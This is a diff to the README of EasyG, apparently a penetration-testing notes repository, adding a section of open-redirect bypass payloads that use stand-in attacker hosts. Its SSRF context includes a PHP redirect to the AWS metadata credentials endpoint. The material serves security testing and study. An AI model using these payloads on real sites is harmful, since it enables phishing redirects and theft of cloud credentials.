@@ -33,6 +33,7 @@ EasyG started out as a script that I use to automate some information gathering 
   - [Access control vulnerabilities and privilege escalation](#access-control-vulnerabilities-and-privilege-escalation)
   - [File upload vulnerabilities](#file-upload-vulnerabilities)
   - [Server-side request forgery (SSRF)](#server-side-request-forgery-ssrf)
+  - [Open redirection](#open-redirection)
   - [XXE injection](#xxe-injection)
   - [Cross-site scripting (XSS)](#cross-site-scripting-xss)
   - [Cross-site request forgery (CSRF)](#cross-site-request-forgery-csrf)
@@ -683,8 +684,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 
 **Other tips**
 - By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
-- Open Redirect Bypass:
-  - https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f
+- [Open redirection](#open-redirection)
 - For AWS, bypass some restrictions by hosting this PHP page ([Reference](https://hackerone.com/reports/508459)):
   ```PHP
   <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
@@ -715,6 +715,22 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
   - Comment: Burp Collab
   - Regex Match: [x]
   ```
+
+
+
+### Open redirection
+
+**Bypasses**
+- https://attacker.com?victim.com
+- https://attacker.com;victim.com
+- https://attacker.com/victim.com/../victimPATH
+- https://victim.com.attacker.com
+- https://attackervictim.com
+- https://victim.com@attacker.com
+- https://attacker.com#victim.com
+- https://attacker.com\.victim.com
+- https://attacker.com/.victim.com
+- https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f
 
 
 
